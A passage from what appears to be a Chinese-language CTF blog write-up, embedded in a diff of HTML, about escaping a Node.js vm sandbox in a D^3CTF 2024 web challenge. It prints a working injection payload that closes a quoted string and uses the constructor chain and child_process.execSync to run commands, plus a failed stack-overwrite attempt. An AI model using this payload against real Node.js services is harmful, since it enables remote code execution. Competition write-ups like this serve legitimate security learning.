+    <span class="token keyword">let</span> cmd <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">let</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> numOfArgs<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        args<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    cmd <span class="token operator">+=</span> <span class="token string">"('"</span>  <span class="token operator">+</span> args<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"','"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"')"</span>
+    <span class="token keyword">let</span> result <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
+    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注意到这里的cmd会与 args 数组里的元素进行拼接<code>cmd += &quot;(&#39;&quot;  + args.join(&quot;&#39;,&#39;&quot;) + &quot;&#39;)&quot;</code></p>
+<p><img src="/blog/2024/04/27/D-3CTF/image-20240430215356265.png" alt="image-20240430215356265"></p>
+<p>效果就像上面这张图一样，会切掉每一个字符，这样明显没法进行逃逸</p>
+<p>然后看一下读取参数的部分</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> <span class="token function-variable function">read</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> count</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> ori <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">[</span>fd<span class="token punctuation">]</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>ori<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> count<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        count <span class="token operator">=</span> ori<span class="token punctuation">.</span>length
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> ori <span class="token operator">!==</span> <span class="token string">"string"</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>ori<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string-property property">"err"</span><span class="token operator">:</span> <span class="token string">"hack!"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span>ori<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string-property property">"err"</span><span class="token operator">:</span> <span class="token string">"hack!"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        stack<span class="token punctuation">[</span><span class="token function">getIndex</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> ori<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注意到传入的参数可以是数组</p>
+<p>那么如果我们传入一个长度为1的数组是否能够绕过<code>join</code>呢？传入<code>&#123;&quot;stdin&quot;:[&quot;abcde&quot;]&#125;</code>试试</p>
+<p><img src="/blog/2024/04/27/D-3CTF/image-20240430220121359.png" alt="image-20240430220121359"></p>
+<p>可以看到这里确实把字符串完整传进去了，那么接下来就可以闭合<code>&#39;)</code>并在末尾加注释符，然后注入命令进行沙盒逃逸了</p>
+<p>payload：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token string-property property">"stdin"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"');var exec = this.constructor.constructor;var require = exec('return process.mainModule.constructor._load')();require('child_process').execSync(\"calc\").toString(); //"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>本地弹计算器成功</p>
+<p><img src="/blog/2024/04/27/D-3CTF/image-20240430220345001.png" alt="image-20240430220345001"></p>
+<p><img src="/blog/2024/04/27/D-3CTF/image-20240430220531623.png" alt="image-20240430220531623"></p>
+<h3 id="pwn的做法（False）"><a href="#pwn的做法（False）" class="headerlink" title="pwn的做法（False）"></a>pwn的做法（False）</h3><p>write溢出pie，不懂</p>
+<p>看一下这里的code</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">    <span class="token keyword">let</span> code <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+28
+[[ 0 ]]
+stdin
+read
+Started Convertion...
+Your input is:
+2
+[[short - 3]]
+stdout
+write
+5
+[[ 0 ]]
+stdout
+write
+...
+1
+[[short - 2]]
+stdout
+write
+[[ 0 ]]
+5
+push
+(function (...a)&#123;  return a.map(char=>char.charCodeAt(0)).join(' ');&#125;)
+5
+call_interface
+Ascii is:
+1
+[[short - 2]]
+result
+write
+1
+&#123;&#123; stack - 2 &#125;&#125;
+result
+write
+Ascii is:
+1
+[[short - 2]]
+stdout
+write
+1
+&#123;&#123; stack - 3 &#125;&#125;
+stdout
+write
+ok
+1
+[[short - 2]]
+status
+write
+exit</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>read覆盖<code>stack[42]</code>，执行call_interface，然后就能rce了</p>
+<p><img src="/blog/2024/04/27/D-3CTF/image-20240430222003350.png" alt="image-20240430222003350"></p>
+<p>复现不出来，摆</p>
 <hr>
 <h2 id="Doctor-Unsolved"><a href="#Doctor-Unsolved" class="headerlink" title="Doctor (Unsolved)"></a>Doctor (Unsolved)</h2>
     </div>
